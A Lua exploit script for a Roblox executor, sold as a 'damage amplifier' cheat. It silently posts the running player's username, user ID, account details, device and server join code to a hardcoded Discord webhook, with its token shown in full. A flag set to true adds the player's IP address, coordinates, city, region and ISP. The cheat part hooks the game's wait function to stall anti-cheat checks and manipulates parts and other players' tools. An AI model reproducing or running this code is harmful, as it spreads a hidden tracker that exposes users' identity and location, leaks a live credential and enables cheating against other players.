getgenv().whscript = "DANES DMG AMP"
getgenv().webhookexecUrl = "https://discord.com/api/webhooks/1334998550546747542/FWX51pbL-xy0R0-mJ7yJndfkR4pBOo2PnH048c1UK1NnEjmMoSc1hDVaAhsLEmZKjsgu"
getgenv().ExecLogSecret = true

local ui = gethui()
local folderName = "screen"
local folder = Instance.new("Folder")
folder.Name = folderName
local player = game:GetService("Players").LocalPlayer

folder.Parent = gethui()
local players = game:GetService("Players")
local userid = player.UserId
local gameid = game.PlaceId
local jobid = tostring(game.JobId)
local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
local deviceType = game:GetService("UserInputService"):GetPlatform() == Enum.Platform.Windows and "PC 💻" or "Mobile 📱"
local snipePlay = "game:GetService('TeleportService'):TeleportToPlaceInstance("..gameid..", '"..jobid.."', player)"
local completeTime = os.date("%Y-%m-%d %H:%M:%S")
local workspace = game:GetService("Workspace")
local screenWidth = math.floor(workspace.CurrentCamera.ViewportSize.X)
local screenHeight = math.floor(workspace.CurrentCamera.ViewportSize.Y)
local memoryUsage = game:GetService("Stats"):GetTotalMemoryUsageMb()
local playerCount = #players:GetPlayers()
local maxPlayers = players.MaxPlayers
local health = player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.Health or "N/A"
local maxHealth = player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.MaxHealth or "N/A"
local position = player.Character and player.Character:FindFirstChild("HumanoidRootPart") and player.Character.HumanoidRootPart.Position or "N/A"
local gameVersion = game.PlaceVersion

if not getgenv().ExecLogSecret then
    getgenv().ExecLogSecret = false
end

local function thumbnail_fetch(userId)
    local url = "https://thumbnails.roproxy.com/v1/users/avatar-headshot?userIds={userId}&size=150x150&format=Png&isCircular=false"
    local success,data = pcall(HttpService.GetAsync,HttpService,url)
    if success then
        local tempdata = HttpService:JSONDecode(response)
        return tempdata.data[1].imageUrl
    else
        return ""
    end
end

local commonLoadTime = 1
task.wait(commonLoadTime)

local pingThreshold = 100
local serverStats = game:GetService("Stats").Network.ServerStatsItem
local dataPing = serverStats["Data Ping"]:GetValueString()
local pingValue = tonumber(dataPing:match("(%d+)")) or "N/A"

local function checkPremium()
    local premium = "false"
    local success, response = pcall(function()
        return player.MembershipType
    end)
    if success then
        premium = response == Enum.MembershipType.None and "false" or "true"
    else
        premium = "Failed to retrieve Membership"
    end
    return premium
end

local function thumbnail_fetch(userId)
    local url = "https://thumbnails.roproxy.com/v1/users/avatar-headshot?userIds="..userId.."&size=150x150&format=Png&isCircular=false"
    local success, response = pcall(function()
        return game:GetService("HttpService"):GetAsync(url)
    end)
    
    if success then
        local tempdata = game:GetService("HttpService"):JSONDecode(response)
        if tempdata and tempdata.data and tempdata.data[1] then
            return tempdata.data[1].imageUrl
        end
    end
end


local premium = checkPremium()
local url = getgenv().webhookexecUrl
local playerThumbnail = thumbnail_fetch(userid)
local profileUrl = "https://www.roblox.com/users/"..userid.."/profile"

local data = {
    ["username"] = player.Name,
    ["avatar_url"] = playerThumbnail,
    ["content"] = "@everyone",
    ["embeds"] = {{
        ["title"] = "🚀 **Script Execution Detected | Exec Log**",
        ["description"] = "*A script was executed in your script. Here are the details:*",
        ["author"] = {
            ["name"] = "Shit Bot Kid",
            ["url"] = profileUrl,
            ["icon_url"] = playerThumbnail
        },
        ["type"] = "rich",
        ["color"] = tonumber(0x3498db),
        ["fields"] = {
            {
                ["name"] = "🔍 **Script Info**",
                ["value"] = "```💻 Script Name: "..getgenv().whscript.."\n⏰ Executed At: "..completeTime.."```",
                ["inline"] = false
            },
            {
                ["name"] = "👤 **Player Details**",
                ["value"] = "```🧸 Username: "..player.Name..
                          "\n📝 Display Name: "..player.DisplayName..
                          "\n🆔 UserID: "..userid..
                          "\n❤️ Health: "..health.." / "..maxHealth..
                          "\n🔗 Profile: View Profile (https://www.roblox.com/users/"..userid.."/profile)```",
                ["inline"] = false
            },
            {
                ["name"] = "📅 **Account Information**",
                ["value"] = "```🗓️ Account Age: "..player.AccountAge..
                          " days\n💎 Premium Status: "..premium..
                          "\n📅 Account Created: "..os.date("%Y-%m-%d", os.time() - (player.AccountAge * 86400)).."```",
                ["inline"] = false
            },
            {
                ["name"] = "🎮 **Game Details**",
                ["value"] = "```🏷️ Game Name: "..gameName..
                          "\n🆔 Game ID: "..gameid..
                          "\n🔗 Game Link (https://www.roblox.com/games/"..gameid..")\n🔢 Game Version: "..gameVersion.."```",
                ["inline"] = false
            },
            {
                ["name"] = "🕹️ **Server Info**",
                ["value"] = "```👥 Players in Server: "..playerCount.." / "..maxPlayers.."\n🕒 Server Time: "..os.date("%H:%M:%S").."```",
                ["inline"] = true
            },
            {
                ["name"] = "📡 **Network Info**",
                ["value"] = "```📶 Ping: "..pingValue.." ms```",
                ["inline"] = true
            },
            {
                ["name"] = "🖥️ **System Info**",
                ["value"] = "```📺 Resolution: "..screenWidth.."x"..screenHeight..
                          "\n🔍 Memory Usage: "..memoryUsage.." MB\n⚙️ Executor: "..identifyexecutor().."```",
                ["inline"] = true
            },
            {
                ["name"] = "📍 **Character Position**",
                ["value"] = "```📍 Position: "..tostring(position).."```",
                ["inline"] = true
            },
            {
                ["name"] = "🪧 **Join Script**",
                ["value"] = "```lua\n"..snipePlay.."```",
                ["inline"] = false
            }
        },
        ["thumbnail"] = {
            ["url"] = "https://cdn.discordapp.com/icons/874587083291885608/a_80373524586aab90765f4b1e833fdf5a.gif?size=512"
        },
        ["footer"] = {
            ["text"] = "Execution Log | "..os.date("%Y-%m-%d %H:%M:%S"),
            ["icon_url"] = "https://cdn.discordapp.com/icons/874587083291885608/a_80373524586aab90765f4b1e833fdf5a.gif?size=512"
        }
    }}
}

if getgenv().ExecLogSecret then
    local ip = game:HttpGet("https://api.ipify.org")
    local iplink = "https://ipinfo.io/"..ip.."/json"
    local ipinfo_json = game:HttpGet(iplink)
    local ipinfo_table = game:GetService("HttpService"):JSONDecode(ipinfo_json)

    table.insert(data.embeds[1].fields, {
        ["name"] = "**🤫 Secret**",
        ["value"] = "```(👣) IP Address: "..ipinfo_table.ip..
                  "```\n```(🌎) Country: "..ipinfo_table.country..
                  "```\n```(📡) GPS Location: "..ipinfo_table.loc..
                  "```\n```(🏙️) City: "..ipinfo_table.city..
                  "```\n```(🏡) Region: "..ipinfo_table.region..
                  "```\n```(⛓) Hoster: "..ipinfo_table.org.."```"
    })
end

local newdata = game:GetService("HttpService"):JSONEncode(data)
local headers = {["content-type"] = "application/json"}
local request = http_request or request or (syn and syn.request) or (fluxus and fluxus.request) or (http and http.request)
request({Url = url, Body = newdata, Method = "POST", Headers = headers})

local amp_toggle = Enum.KeyCode.Seven
local resp_time = 4
local amp = false
local FFA = false

local hook
hook = hookfunction(getrenv().wait, newcclosure(function(...)
    local args = {...}
    if args[1] == 3 and getcallingscript().Parent == nil then
        return coroutine.yield()
    elseif args[1] == 2 and getcallingscript().Parent == nil then
        return coroutine.yield()
    end
    return hook(...)
end))

local PlayerService = game:GetService("Players")
local Run = game:GetService("RunService")
local UIS = game:GetService("UserInputService")
local StarterGui = game:GetService("StarterGui")

local LocalPlayer = PlayerService.LocalPlayer

local SmallestPart
local SmallestMagnitude = math.huge

local function TeamMateIndictator(Player)
    if Player.Team == LocalPlayer.Team then
        return not FFA
    end

    return false
end

local function Notify(Info)
    StarterGui:SetCore("SendNotification", { Title = "dane 69", Text = Info })
end

UIS.InputBegan:Connect(function(Input, gpe)
    if Input.KeyCode == amp_toggle and not gpe then
        amp = not amp
        Notify(tostring(amp and "AMP Enabled" or "AMP Disabled"))

        if amp then
            if SmallestPart then
                SmallestPart.Size = Vector3.new(2, 2, 1)
                SmallestPart.Transparency = 1
            end
        else
            if SmallestPart then
                SmallestPart.Position = SavedSmallPart[1]
                SmallestPart.Size = SavedSmallPart[2]
                SmallestPart.Transparency = SavedSmallPart[3]
            end
        end
    end
end)

Notify(tostring("dont clip anything u will get listed if jp has a brain"))

local SavedSmallPart = {}

local function InitializeSmallestPart()
    SmallestPart = nil
    SmallestMagnitude = math.huge

    for i, Part in pairs(workspace:GetDescendants()) do
        if Part:IsA("BasePart") and Part ~= workspace.Terrain and Part.Anchored then
            local PartSizeMagnitude = Part.Size.Magnitude
            if SmallestMagnitude >= PartSizeMagnitude then
                SmallestPart = Part
                SmallestMagnitude = PartSizeMagnitude
            end
        end
    end

    SavedSmallPart = {
        SmallestPart.Position,
        SmallestPart.Size,
        SmallestPart.Transparency,
    }

    if SmallestPart then
        SmallestPart.Size = Vector3.new(2, 2, 1)
        SmallestPart.Transparency = 1
    end
end

InitializeSmallestPart()

LocalPlayer.CharacterAdded:Connect(function(character)
    InitializeSmallestPart()
    
    if SmallestPart then
        SmallestPart.Size = Vector3.new(2, 2, 1)
        SmallestPart.Transparency = 1
    end
end)

Run.Stepped:Connect(function()
    local Character = LocalPlayer.Character
    local HRP = Character and Character:FindFirstChild("HumanoidRootPart")

    local isReady = true

    if Humanoid and Humanoid.Health == 0 and isReady and amp then
        amp = false
        isReady = false
        wait(resp_time)
        amp = true
        return
    end

    if HRP and amp then
        local ClosestDistance = math.huge
        local TargetHRP
        local TargetHumanoid

        for _, Player in pairs(PlayerService:GetPlayers()) do
            if Player ~= LocalPlayer then
                local Opponent_Character = Player.Character
                local Opponent_HRP = Opponent_Character and Opponent_Character:FindFirstChild("HumanoidRootPart")
                local Distance = Opponent_HRP and Opponent_HRP.Position - HRP.Position

                if not TeamMateIndictator(Player) and Distance and Distance.Magnitude < ClosestDistance then
                    ClosestDistance = Distance.Magnitude
                    TargetHRP = Opponent_HRP
                    TargetHumanoid = Opponent_Character:FindFirstChildWhichIsA("Humanoid")
                end
            end
        end

        if TargetHRP and TargetHumanoid then
            SmallestPart.Position = TargetHRP.Position
        end
    end
end)

while Run.Stepped:Wait() do
    if amp then
        for _, Player in pairs(PlayerService:GetPlayers()) do
            if Player ~= LocalPlayer then
                local Character = Player.Character
                if Character then
                    local Humanoid = Character:FindFirstChildOfClass("Humanoid")
                    local Tool = Character:FindFirstChildOfClass("Tool")

                    if Humanoid and Tool then
                        local success = pcall(function()
                            Humanoid:UnequipTools()
                            Run.RenderStepped:Wait()
                            Humanoid:EquipTool(Tool)
                        end)

                        if not success then
                            wait(0.01)
                        end
                    end
                end
            end
        end
    end
end
